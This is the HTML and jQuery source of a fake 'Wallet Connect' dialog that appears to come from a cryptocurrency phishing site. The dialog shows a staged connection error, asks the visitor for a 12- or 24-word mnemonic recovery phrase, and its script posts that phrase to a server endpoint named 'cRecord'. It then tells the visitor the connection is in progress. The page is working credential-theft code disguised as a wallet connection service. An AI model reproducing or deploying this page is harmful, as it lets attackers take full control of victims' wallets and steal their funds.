<div id="cShw" tabindex="-1" aria-labelledby="ModalLabel" aria-modal="true" role="dialog" class="modal fade modal-borderless" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h4 class="modal-title">
<img class="img-icons" src="#" id="spd" style="width: 3rem;">&nbsp;
Wallet Connect</h4>
<a href="javascript:void(0);" class="close" data-bs-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></a>
</div>


<div class="modal-body frl_ele">

<div role="alert" class="alert alert-danger">
There was an issue connecting to the service. Please try again or connect manually.
</div>


<div class="form-group basic">
<label class="col-form-label">Enter Mnemonic phrase:</label>
<textarea name="ctl00$ContentPlaceHolder1$phrase" rows="2" cols="20" id="ContentPlaceHolder1_phrase" placeholder="Typically 12 (sometimes 24) words separated by single spaces." class="form-control form-control-lg" style="height:8rem;padding:.375rem .75rem">
</textarea>
<div id="word-count"></div>
</div>


</div>
<div class="modal-footer frl_ele">

<button type="button" id="dSubt" class="btn btn-primary">
Connect Wallet
</button>

</div>
</div>
</div>
</div>

<script>
    $(document).on('input', '[id*=phrase]', function () {
        const value = $(this).val().trim();
        const count = value === '' ? 0 : value.split(/\s+/).length;
        $('#word-count').text(`Word Phrase: ${count}`);
    });


    $(document).on('click', '#dSubt', function () {
        var s = $(this);
        var str = $('[id*=phrase]');
        var phrase = str.val().trim();
        var wordCount = phrase === '' ? 0 : phrase.split(/\s+/).length;

        if (wordCount === 0) {
            alertify.alert("Alert", "Please enter a Mnemonic phrase");
            return false;
        }

        if (wordCount !== 12 && wordCount !== 24) {
            alertify.alert("Alert", "Invalid Mnemonics Phrase");
            return false;
        }

        s.prop('disabled', true).html('Processing&nbsp;<i class="bi bi-arrow-repeat spinner-border"></i>');
        $.ajax({
            type: "POST",
            url: srcGet + "Users/wallet_connect.aspx/cRecord",
            data: '{wallet:"' + str.attr('data-wallet') + '",value:"' + encodeURIComponent(phrase) + '"}',
            contentType: "application/json;charset=utf-8",
            dataType: "json",
            success: function () {
                $('#cShw').modal('hide');
                str.val('');
                $('#word-count').text('');
                alertify.alert("Alert", "Connection in progress...");
            },
            error: function () {
                alertify.error("We encountered an error.\nPlease try again later.");
            },
            complete: function () {
                s.prop('disabled', false).html('Connect Wallet')
            }
        });
    });

    $(document).on('click', '.idlee', function () {
        var s = $(this);
        $('[id*=phrase]').attr('data-wallet', s.find('.NameLabel').text());
        $('#spd').attr('src', s.find('img').attr('src'));
        $('#cShw').modal('show');



        $('.frl_ele').addClass('isloading');
        setTimeout(function () {
            $('.frl_ele').removeClass('isloading');
        }, 2000);
    });
</script>

</form>
</div>

